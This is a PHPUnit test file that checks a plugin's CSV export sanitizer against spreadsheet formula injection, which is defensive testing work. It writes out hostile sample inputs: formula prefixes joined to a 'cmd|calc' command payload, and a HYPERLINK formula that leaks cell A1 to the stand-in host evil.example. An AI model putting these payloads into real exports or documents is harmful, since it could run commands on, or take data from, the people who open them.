<?php
/**
 * @package RK_Suite\Tests
 */

use PHPUnit\Framework\TestCase;

require_once __DIR__ . '/../modules/rk-forms/includes/class-rk-forms-admin.php';

/**
 * RK_Forms_Admin::csv_safe() must neutralize spreadsheet formula injection.
 */
final class CsvSafeTest extends TestCase {

	private function csv_safe( $v ) {
		$m = new ReflectionMethod( 'RK_Forms_Admin', 'csv_safe' );
		$m->setAccessible( true );
		return $m->invoke( null, $v );
	}

	public function test_formula_prefixes_are_neutralized() {
		foreach ( array( '=', '+', '-', '@', "\t", "\r" ) as $lead ) {
			$out = $this->csv_safe( $lead . 'cmd|calc' );
			$this->assertSame( "'", $out[0], "Leading '$lead' must be quote-prefixed" );
		}
	}

	public function test_hyperlink_payload_is_neutralized() {
		$evil = '=HYPERLINK("http://evil.example/?leak="&A1,"click")';
		$this->assertSame( "'" . $evil, $this->csv_safe( $evil ) );
	}

	public function test_safe_values_are_untouched() {
		$this->assertSame( 'hello world', $this->csv_safe( 'hello world' ) );
		$this->assertSame( 'jane@example.com', $this->csv_safe( 'jane@example.com' ) );
		$this->assertSame( '123 Main St', $this->csv_safe( '123 Main St' ) );
		$this->assertSame( '', $this->csv_safe( '' ) );
	}
}
